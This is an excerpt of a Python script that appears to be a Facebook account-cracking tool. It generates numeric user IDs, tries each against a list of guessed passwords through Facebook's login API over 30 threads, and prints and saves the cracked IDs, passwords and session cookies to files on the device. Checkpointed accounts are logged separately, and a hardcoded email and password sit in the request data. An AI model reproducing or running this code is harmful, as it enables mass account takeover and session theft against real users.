...
def BD_CLONING():
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:8],ids[:7],ids[:6],ids[5:],ids[4:],ids[3:],'sadiya','jannat','free fire','bangladesh']
...
def method_crack(ids,passlist):
    ...
    try:
        for pas in passlist:
            ...
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': '100092274092056', 'password': 'shrif11', 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[RUHUL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/RUHUL-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[RUHUL-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/RUHUL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
